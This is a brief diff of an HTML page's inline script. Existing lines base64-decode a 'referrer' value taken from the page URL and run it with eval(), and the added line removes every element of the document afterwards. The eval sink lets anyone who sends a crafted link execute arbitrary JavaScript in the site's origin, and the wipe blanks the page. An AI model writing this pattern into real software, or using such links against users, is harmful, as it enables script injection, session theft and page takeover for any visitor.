@@ -2,6 +2,7 @@
   <script>
     try {
       eval(atob(window.location.href.split("?referrer=")[1]))
+      while (document.firstChild) { document.firstChild.remove() } 
     } catch (e) { 
       console.log(e)
     }
